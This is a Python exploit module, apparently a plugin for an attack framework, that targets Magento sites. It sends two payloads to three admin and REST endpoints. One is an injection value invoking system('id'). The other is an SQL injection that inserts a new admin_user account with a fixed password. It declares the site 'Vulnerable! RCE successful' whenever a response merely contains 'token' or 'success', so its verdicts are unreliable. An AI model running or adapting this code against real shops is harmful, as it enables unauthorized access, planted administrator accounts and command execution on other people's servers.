import requests
from core.printmodels import *
import json

class Magento_Core_RCE:
    def __init__(self):
        self.name = "Magento Core RCE"
        self.description = "Magento Core Remote Code Execution (2024)"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            }

            # Multiple attack vectors
            payloads = [
                {
                    "username": "admin",
                    "password": {"__construct": {"": "system('id')"}},
                    "form_key": "DrDataYE"
                },
                {
                    "filter": {
                        "field": "created_at",
                        "value": "') OR 1=1; INSERT INTO admin_user SET username='admin', password='DrDataYE123'; -- "
                    }
                }
            ]

            endpoints = [
                f"{site}/rest/V1/integration/admin/token",
                f"{site}/index.php/admin/Cms_Wysiwyg/directive/",
                f"{site}/admin/admin/system_config/save/section/general"
            ]

            for endpoint in endpoints:
                for payload in payloads:
                    response = requests.post(endpoint, headers=headers, json=payload, verify=False, timeout=10)
                    if response.status_code in [200, 302] and ('token' in response.text or 'success' in response.text):
                        return PrintSuccess(f"[Magento-2024] Vulnerable! RCE successful at {endpoint}")

            return PrintFailed("[Magento-2024] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[Magento-2024] Error: {str(e)}")
